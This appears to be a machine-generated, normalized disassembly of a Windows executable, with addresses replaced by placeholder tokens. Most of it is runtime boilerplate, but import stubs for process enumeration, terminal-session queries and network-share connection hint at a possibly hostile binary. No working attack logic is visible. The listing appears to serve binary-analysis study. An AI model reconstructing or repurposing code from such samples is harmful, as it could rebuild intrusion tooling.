ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_40120b
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
leave
retn
sub_40121a
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40122e
mov eax [ ebp - 0x4 ]
leave
retn
sub_4012c4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
xor al al
mov al 0x1
jmp r-xdata
leave
retn
sub_401508
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_401525
mov eax [ ebp - 0x4 ]
leave
retn
sub_40151c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
leave
retn
sub_401577
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax 0x80121211
leave
retn
sub_40162c
push ebp
mov ebp esp
sub esp 0x194
mov [ ebp - 0x194 ] ecx
lea eax [ ebp - 0x190 ]
push eax
push 0x2
call [ WSAStartup@IAT ]
mov eax [ ebp - 0x194 ]
leave
retn
sub_401652
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
call [ WSACleanup@IAT ]
leave
retn
sub_401963
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
and [ eax + 0x80 ] 0x0
mov eax [ ebp - 0x4 ]
leave
retn
sub_402571
push ebp
mov ebp esp
push 0x10
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40325a
add esp 0xc
neg eax
sbb eax eax
inc eax
pop ebp
retn
sub_4025a5
push ebp
mov ebp esp
pop ebp
retn
Process32FirstW
jmp [ Process32FirstW@IAT ]
Process32NextW
jmp [ Process32NextW@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
GetPrinterDataW
jmp [ GetPrinterDataW@IAT ]
OpenPrinterW
jmp [ OpenPrinterW@IAT ]
sub_402b33
call sub_4054bc
retn
sub_402b39
push [ esp + 0x4 ]
call sub_402afd
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
retn
sub_402eb5
push ecx
mov [ ecx ] r--data
call sub_405966
pop ecx
retn
sub_402ec3
push esi
mov esi ecx
call sub_402eb5
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_405a68
pop ecx
sub_402edf
mov eax [ esp + 0x4 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_4059e0
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
retn 0x4
sub_402eff
push esi
call sub_405021
mov esi [ eax + 0x80 ]
call sub_405021
mov ecx [ esp + 0x8 ]
mov [ eax + 0x80 ] ecx
mov eax esi
pop esi
retn
sub_402f1e
mov eax ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
retn
sub_402fd5
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_405a68
pop ecx
sub_402feb
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_402ff8
push esi
mov esi ecx
call sub_402fd5
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_405a68
pop ecx
sub_404b47
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x2c ] ecx
push eax
push ecx
call sub_407142
pop ecx
pop ecx
retn
sub_404b81
xor eax eax
inc eax
retn
_start
call sub_407aaf
jmp sub_4049ba
sub_404d0e
and [ rw-data ] 0x0
call sub_407b93
mov [ rw-data ] eax
xor eax eax
retn
sub_404dfc
push 0x0
call sub_404d8e
pop ecx
retn
sub_404e73
call [ TlsAlloc@IAT ]
retn 0x4
sub_404fa1
push 0xc
call sub_407c9e
pop ecx
retn
sub_405145
push 0xd
call sub_407c9e
pop ecx
retn
sub_405151
push 0xc
call sub_407c9e
pop ecx
retn
sub_40544b
push 0x4
call sub_407c9e
pop ecx
retn
sub_405454
call sub_407109
push [ esp + 0x4 ]
call sub_406f69
push [ rw-data ]
call sub_404e05
push 0xff
call eax
add esp 0xc
retn
sub_405478
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ esp + 0x4 ]
call eax
sub_40549e
push [ esp + 0x4 ]
call sub_405478
pop ecx
push [ esp + 0x4 ]
call [ ExitProcess@IAT ]
int3
sub_4054b3
push 0x8
call sub_407d76
pop ecx
retn
sub_4054bc
push 0x8
call sub_407c9e
pop ecx
retn
sub_4056cf
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_407c9e
pop ecx
sub_4056e4
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_405602
add esp 0xc
retn
sub_4056f5
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_405602
add esp 0xc
retn
sub_405706
push 0x1
push 0x0
push 0x0
call sub_405602
add esp 0xc
retn
sub_405715
push 0x1
push 0x1
push 0x0
call sub_405602
add esp 0xc
retn
sub_4057b5
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_4059cd
push 0xe
call sub_407c9e
pop ecx
retn
sub_405abe
push 0x4
call sub_407c9e
pop ecx
retn
sub_405af6
push 0x8
push r--data
call sub_405770
call sub_405021
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_40919b
and [ ebp - 0x4 ] 0x0
call eax
jmp sub_405b1d
sub_405b1d
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40919b
sub_405b2f
call sub_405021
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_405af6
call eax
sub_405b66
xor eax eax
inc eax
retn
sub_405b79
push sub_405af6
call sub_404d8e
pop ecx
mov [ rw-data ] eax
retn
sub_405c35
push 0x4
call sub_407c9e
pop ecx
retn
sub_406044
push 0xd
call sub_407c9e
pop ecx
retn
sub_406401
push 0xd
call sub_407c9e
pop ecx
retn
sub_40643a
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_4062a0
pop ecx
mov [ rw-data ] 0x1
sub_406752
push 0xc
call sub_407c9e
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_406c98
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_406df4
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_406f5b
push sub_406f1e
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_40799b
xor eax eax
inc eax
retn
sub_407b43
push 0xc
push r--data
call sub_405770
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_4057b5
retn
sub_407b60
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_407bf3
call sub_407b93
mov [ rw-data ] eax
xor eax eax
retn
sub_407c9e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_407d6d
push 0xa
call sub_407c9e
pop ecx
retn
sub_407ea3
push 0x4
call sub_407c9e
pop ecx
retn
sub_408009
push 0x4
call sub_407c9e
pop ecx
retn
sub_408d09
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_408d3b
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
sub_408d88
push [ rw-data ]
call sub_404e05
pop ecx
retn
sub_408f09
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_407c9e
pop ecx
sub_408f45
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_408f4f
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_408f59
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_408f63
push [ esp + 0x4 ]
call [ InitializeCriticalSection@IAT ]
xor eax eax
inc eax
retn 0x8
sub_408ff9
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x24 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_409010
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x24 ] 0xc0000017
jne r-xdata
and [ ebp - 0x20 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_4057b5
retn
push 0x8
call [ SetLastError@IAT ]
sub_409038
cmp ecx [ rw-data ]
jne r-xdata
jmp sub_409dac
retn
sub_40911e
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_409048
add esp 0xc
pop ebp
retn 0x4
sub_409184
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_409048
add esp 0xc
pop ebp
retn 0x8
sub_409a90
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40a0e0
sub_409aa6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40a0e0
sub_409d18
push 0x4
push 0x0
push [ esp + 0xc ]
push 0x0
call sub_409cc7
add esp 0x10
retn
sub_409d2b
push 0x2
call sub_405454
pop ecx
retn
sub_409f99
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_409ed0
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_409fe4
call eax
retn
sub_40a0c4
push 0xa
push 0x0
push [ esp + 0xc ]
call sub_40a336
add esp 0xc
retn
sub_40a3d0
lea eax [ edx - 0x1 ]
pop ebx
retn
WTSFreeMemory
jmp [ WTSFreeMemory@IAT ]
WTSQuerySessionInformationW
jmp [ WTSQuerySessionInformationW@IAT ]
GetComputerObjectNameW
jmp [ GetComputerObjectNameW@IAT ]
WNetAddConnection2W
jmp [ WNetAddConnection2W@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_40aca8
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_40c0a4
leave
retn 0x4
sub_40e208
push ebp
mov ebp esp
xor al al
pop ebp
retn
sub_4103dd
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_410300
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58c8 ]
leave
retn
sub_413197
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov al 0x1
leave
retn
sub_413223
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58b0 ]
leave
retn
sub_413235
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58ac ]
leave
retn
sub_413326
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x5760 ] ecx
leave
retn 0x4
sub_413388
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_413925
push ebp
mov ebp esp
push sub_4138d4
call sub_402eff
pop ecx
pop ebp
retn
sub_413986
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
inc eax
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x8 ] eax
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_413a42
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x8 ]
inc eax
mov ecx [ ebp - 0x1c ]
mov [ ecx + 0x8 ] eax
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_413b00
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
inc eax
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + 0x8 ]
mov [ ecx ] eax
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_414f9a
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c ]
call sub_4010a3
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x14
sub_4151d7
mov eax [ ebp - 0x14 ]
mov [ eax + 0x10 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_416bb4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_4106f0
mov ecx [ ebp - 0x4 ]
add ecx 0x10
call sub_4106f0
mov al 0x1
leave
retn
sub_417169
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_41718a
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x7
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_416efe
leave
retn 0xc
sub_4171a8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push [ ebp + 0xc ]
push 0x8
push 0x4
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_416efe
leave
retn 0x8
sub_4171c5
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push [ ebp + 0xc ]
push 0x4
push 0x1
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_416efe
leave
retn 0x8
sub_417214
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x6
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_4171e2
leave
retn 0xc
sub_417400
mov eax [ ebp - 0x14 ]
mov [ eax + 0x10 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_41b4f9
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_40fdaa
pop ebp
retn
sub_41f5ef
retn
sub_41f5f0
mov eax sub_42052c
mov [ rw-data ] eax
mov [ rw-data ] sub_41fc28
mov [ rw-data ] sub_41fbe6
mov [ rw-data ] sub_41fc1a
mov [ rw-data ] sub_41fb90
mov [ rw-data ] eax
mov [ rw-data ] sub_4204a6
mov [ rw-data ] sub_41fba6
mov [ rw-data ] sub_41fb10
mov [ rw-data ] sub_41fa9f
retn
sub_41f650
call sub_41f5f0
call sub_4205b2
cmp [ esp + 0x4 ] 0x0
mov [ rw-data ] eax
je r-xdata
fnclex
retn
call sub_42054d
sub_41f9ac
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov [ esi ] eax
call sub_405021
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_405021
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
retn
sub_41fb90
fldz
mov eax [ esp + 0x4 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
retn
xor eax eax
inc eax
retn
sub_41fbe6
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_41fba6
add esp 0x10
retn
sub_41fc1a
push 0x0
push [ esp + 0x8 ]
call sub_41fa9f
pop ecx
pop ecx
retn
sub_41fc28
push 0x0
push [ esp + 0x8 ]
call sub_41fb10
pop ecx
pop ecx
retn
sub_41fe71
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41fda3
add esp 0x18
pop ebp
retn
sub_4205db
mov [ ecx ] r--data
jmp sub_402fd5
sub_4205e6
push esi
mov esi ecx
mov [ esi ] r--data
call sub_402fd5
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_405a68
pop ecx
sub_42072a
push [ ebp - 0x14 ]
call sub_420664
pop ecx
retn
sub_42076e
call sub_405021
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_405021
add eax 0x90
dec [ eax ]
sub_420811
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_42081a
mov esp [ ebp - 0x18 ]
jmp sub_405af6
sub_4208c0
push 0x4
mov eax sub_423dc2
call sub_421789
call sub_405021
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_405b2f
call sub_405b42
sub_420999
mov eax [ ebp - 0x14 ]
call sub_420789
retn
sub_420c10
xor eax eax
inc eax
retn
sub_420c14
mov esp [ ebp - 0x18 ]
jmp sub_405af6
sub_420ca9
xor eax eax
inc eax
retn
sub_420cad
mov esp [ ebp - 0x18 ]
jmp sub_405af6
sub_421169
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_402f7d
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_4217bf
xor eax eax
inc eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
retn
xor eax eax
sub_423800
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_423845
mov ecx [ ebp - 0x10 ]
jmp sub_402fd5
sub_42384d
mov eax r--data
jmp sub_41f761
sub_423857
mov ecx [ ebp - 0x10 ]
jmp sub_401393
sub_42385f
mov eax r--data
jmp sub_41f761
sub_423869
mov eax r--data
jmp sub_41f761
sub_423873
mov eax r--data
jmp sub_41f761
sub_42387d
mov eax r--data
jmp sub_41f761
sub_423887
mov eax r--data
jmp sub_41f761
sub_423891
mov eax r--data
jmp sub_41f761
sub_42389b
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_4238a9
mov eax r--data
jmp sub_41f761
sub_4238b3
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_4238c1
mov eax r--data
jmp sub_41f761
sub_4238cb
lea ecx [ ebp - 0x1c ]
jmp sub_4010a3
sub_4238d3
mov eax r--data
jmp sub_41f761
sub_4238dd
lea ecx [ ebp - 0x28 ]
jmp sub_4010a3
sub_4238e5
mov eax r--data
jmp sub_41f761
sub_4238ef
lea ecx [ ebp - 0x20 ]
jmp sub_4010a3
sub_4238f7
mov eax r--data
jmp sub_41f761
sub_423901
lea ecx [ ebp - 0xfc ]
jmp sub_401979
sub_42390c
mov eax r--data
jmp sub_41f761
sub_423916
mov ecx [ ebp - 0x10 ]
jmp sub_4010a3
sub_42391e
mov ecx [ ebp - 0x10 ]
add ecx 0x10
jmp sub_4010a3
sub_423929
mov eax r--data
jmp sub_41f761
sub_423933
mov ecx [ ebp - 0x10 ]
jmp sub_4010a3
sub_42393b
mov ecx [ ebp - 0x10 ]
add ecx 0x10
jmp sub_4010a3
sub_423946
mov eax r--data
jmp sub_41f761
sub_423950
lea ecx [ ebp - 0x20 ]
jmp sub_4010a3
sub_423958
mov eax r--data
jmp sub_41f761
sub_423962
lea ecx [ ebp - 0x260 ]
jmp sub_416bd2
sub_42396d
lea ecx [ ebp - 0x240 ]
jmp sub_4010a3
sub_423978
lea ecx [ ebp - 0x1c ]
jmp sub_4010a3
sub_423980
mov eax r--data
jmp sub_41f761
sub_42398a
lea ecx [ ebp - 0x30 ]
jmp sub_416bd2
sub_423992
lea ecx [ ebp - 0x48 ]
jmp sub_4010a3
sub_42399a
mov eax r--data
jmp sub_41f761
sub_4239a4
lea ecx [ ebp - 0x40 ]
jmp sub_4010a3
sub_4239ac
lea ecx [ ebp - 0x28 ]
jmp sub_4010a3
sub_4239b4
mov eax r--data
jmp sub_41f761
sub_4239be
lea ecx [ ebp - 0x44 ]
jmp sub_416bd2
sub_4239c6
lea ecx [ ebp - 0x58 ]
jmp sub_4010a3
sub_4239ce
lea ecx [ ebp - 0x1c ]
jmp sub_4010a3
sub_4239d6
mov eax r--data
jmp sub_41f761
sub_4239e0
lea ecx [ ebp - 0x3c ]
jmp sub_416bd2
sub_4239e8
lea ecx [ ebp - 0x1c ]
jmp sub_4010a3
sub_4239f0
mov eax [ ebp - 0x40 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x40 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_416bd2
sub_423a09
mov eax r--data
jmp sub_41f761
sub_423a13
mov ecx [ ebp - 0x24 ]
jmp sub_416bd2
sub_423a1b
lea ecx [ ebp - 0x20 ]
jmp sub_4010a3
sub_423a23
mov eax r--data
jmp sub_41f761
sub_423a2d
lea ecx [ ebp - 0x1c ]
jmp sub_4010a3
sub_423a35
mov eax r--data
jmp sub_41f761
sub_423a3f
mov eax r--data
jmp sub_41f761
sub_423a49
lea ecx [ ebp - 0x4c ]
jmp sub_4010a3
sub_423a51
mov eax r--data
jmp sub_41f761
sub_423a5b
lea ecx [ ebp - 0x40 ]
jmp sub_4010a3
sub_423a63
mov eax r--data
jmp sub_41f761
sub_423a6d
lea ecx [ ebp - 0x1c ]
jmp sub_4010a3
sub_423a75
mov eax r--data
jmp sub_41f761
sub_423a7f
lea ecx [ ebp - 0x2c ]
jmp sub_4010a3
sub_423a87
mov eax r--data
jmp sub_41f761
sub_423a91
lea ecx [ ebp - 0x224 ]
jmp sub_4010a3
sub_423a9c
mov eax r--data
jmp sub_41f761
sub_423aa6
lea ecx [ ebp - 0x5c ]
jmp sub_416bd2
sub_423aae
lea ecx [ ebp - 0x106c ]
jmp sub_4010a3
sub_423ab9
lea ecx [ ebp - 0x107c ]
jmp sub_4010a3
sub_423ac4
lea ecx [ ebp - 0x1c ]
jmp sub_4010a3
sub_423acc
mov eax r--data
jmp sub_41f761
sub_423ad6
lea ecx [ ebp - 0x24 ]
jmp sub_4010a3
sub_423ade
lea ecx [ ebp - 0x38 ]
jmp sub_4010a3
sub_423ae6
mov eax r--data
jmp sub_41f761
sub_423af0
lea ecx [ ebp - 0x6c ]
jmp sub_4010a3
sub_423af8
mov eax r--data
jmp sub_41f761
sub_423b02
lea ecx [ ebp - 0x1084 ]
jmp sub_4010a3
sub_423b0d
lea ecx [ ebp - 0x1db4 ]
jmp sub_4010a3
sub_423b18
lea ecx [ ebp - 0xcec ]
jmp sub_4010a3
sub_423b23
lea ecx [ ebp - 0xcdc ]
jmp sub_4010a3
sub_423b2e
mov eax r--data
jmp sub_41f761
sub_423b38
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_423b46
mov eax r--data
jmp sub_41f761
sub_423b50
lea ecx [ ebp - 0x12140 ]
jmp sub_416bd2
sub_423b5b
lea ecx [ ebp - 0x12150 ]
jmp sub_4010a3
sub_423b66
mov eax r--data
jmp sub_41f761
sub_423b70
lea ecx [ ebp - 0x1c ]
jmp sub_4010a3
sub_423b78
mov eax r--data
jmp sub_41f761
sub_423b82
lea ecx [ ebp - 0x40 ]
jmp sub_4010a3
sub_423b8a
mov eax r--data
jmp sub_41f761
sub_423b94
lea ecx [ ebp - 0x74 ]
jmp sub_4010a3
sub_423b9c
lea ecx [ ebp - 0x64 ]
jmp sub_4010a3
sub_423ba4
push [ ebp - 0x54 ]
push [ ebp - 0xc4 ]
call sub_4025a5
pop ecx
pop ecx
retn
sub_423bb5
push [ ebp - 0x94 ]
push [ ebp - 0xcc ]
call sub_4025a5
pop ecx
pop ecx
retn
sub_423bc9
mov eax r--data
jmp sub_41f761
sub_423bd3
lea ecx [ ebp - 0xc4 ]
jmp sub_416bd2
sub_423bde
lea ecx [ ebp - 0x108 ]
jmp sub_416bd2
sub_423be9
mov eax r--data
jmp sub_41f761
sub_423bf3
lea ecx [ ebp - 0x46c ]
jmp sub_416bd2
sub_423bfe
lea ecx [ ebp - 0x498 ]
jmp sub_416bd2
sub_423c09
mov eax r--data
jmp sub_41f761
sub_423c13
lea ecx [ ebp - 0x30 ]
jmp sub_416bd2
sub_423c1b
lea ecx [ ebp - 0x490 ]
jmp sub_416bd2
sub_423c26
mov eax r--data
jmp sub_41f761
sub_423c30
lea ecx [ ebp - 0x2c ]
jmp sub_416bd2
sub_423c38
lea ecx [ ebp - 0x70 ]
jmp sub_416bd2
sub_423c40
mov eax r--data
jmp sub_41f761
sub_423c4a
lea ecx [ ebp - 0x370 ]
jmp sub_4010a3
sub_423c55
lea ecx [ ebp - 0x2c ]
jmp sub_416bd2
sub_423c5d
lea ecx [ ebp - 0x3a8 ]
jmp sub_416bd2
sub_423c68
mov eax r--data
jmp sub_41f761
sub_423c72
lea ecx [ ebp - 0x2f0 ]
jmp sub_4010a3
sub_423c7d
lea ecx [ ebp - 0x54 ]
jmp sub_416bd2
sub_423c85
lea ecx [ ebp - 0x324 ]
jmp sub_416bd2
sub_423c90
mov eax r--data
jmp sub_41f761
sub_423c9a
lea ecx [ ebp - 0x6d4 ]
jmp sub_40f7b3
sub_423ca5
lea ecx [ ebp - 0x38 ]
jmp sub_4010a3
sub_423cad
lea ecx [ ebp - 0x264 ]
jmp sub_401c6b
sub_423cb8
lea ecx [ ebp - 0x1c ]
jmp sub_401c6b
sub_423cc0
lea ecx [ ebp - 0x48 ]
jmp sub_4010a3
sub_423cc8
mov eax r--data
jmp sub_41f761
sub_423cd2
lea ecx [ ebp - 0x2dc ]
jmp sub_40f7b3
sub_423cdd
lea ecx [ ebp - 0x38 ]
jmp sub_4010a3
sub_423ce5
lea ecx [ ebp - 0x7c ]
jmp sub_401c6b
sub_423ced
lea ecx [ ebp - 0x1c ]
jmp sub_401c6b
sub_423cf5
mov eax r--data
jmp sub_41f761
sub_423cff
lea ecx [ ebp - 0x3c ]
jmp sub_4010a3
sub_423d07
lea ecx [ ebp - 0x2c ]
jmp sub_4010a3
sub_423d0f
lea ecx [ ebp - 0x1c ]
jmp sub_4010a3
sub_423d17
mov eax r--data
jmp sub_41f761
sub_423d21
mov eax r--data
jmp sub_41f761
sub_423d2b
lea ecx [ ebp - 0xa4 ]
jmp sub_4010a3
sub_423d36
lea ecx [ ebp - 0x30 ]
jmp sub_416bd2
sub_423d3e
mov eax r--data
jmp sub_41f761
sub_423d48
mov ecx [ ebp - 0x10 ]
jmp sub_402fd5
sub_423d50
mov eax r--data
jmp sub_41f761
sub_423d5a
mov ecx [ ebp - 0x10 ]
jmp sub_401393
sub_423d62
mov eax r--data
jmp sub_41f761
sub_423d6c
mov ecx [ ebp - 0x10 ]
jmp sub_4010a3
sub_423d74
mov eax r--data
jmp sub_41f761
sub_423d7e
mov ecx [ ebp - 0x10 ]
add ecx 0x10
jmp sub_401c6b
sub_423d89
mov eax r--data
jmp sub_41f761
sub_423d93
mov ecx [ ebp - 0x10 ]
jmp sub_4010a3
sub_423d9b
mov ecx [ ebp - 0x10 ]
add ecx 0x10
jmp sub_4010a3
sub_423da6
mov eax r--data
jmp sub_41f761
sub_423db0
mov ecx [ ebp - 0x10 ]
jmp sub_416bd2
sub_423db8
mov eax r--data
jmp sub_41f761
sub_423dc2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_409038
mov eax r--data
jmp sub_41f761
sub_423ddd
push ebp
mov ebp esp
mov ecx rw-data
call sub_4010c5
push sub_4242e2
call sub_402b39
pop ecx
pop ebp
retn
sub_423df7
push ebp
mov ebp esp
mov ecx rw-data
call sub_401508
push sub_424300
call sub_402b39
pop ecx
pop ebp
retn
sub_423e11
push ebp
mov ebp esp
mov ecx rw-data
call sub_40162c
push sub_42430f
call sub_402b39
pop ecx
pop ebp
retn
sub_423e2b
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_401897
pop ebp
retn
sub_423e3f
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_4018db
pop ebp
retn
sub_423e53
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_40191f
pop ebp
retn
sub_423e67
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_4019fd
pop ebp
retn
sub_423e7b
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_401a3e
pop ebp
retn
sub_423e8f
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_401a7f
pop ebp
retn
sub_423ea3
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_401ac3
pop ebp
retn
sub_423eb7
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_401b07
pop ebp
retn
sub_423ecb
push ebp
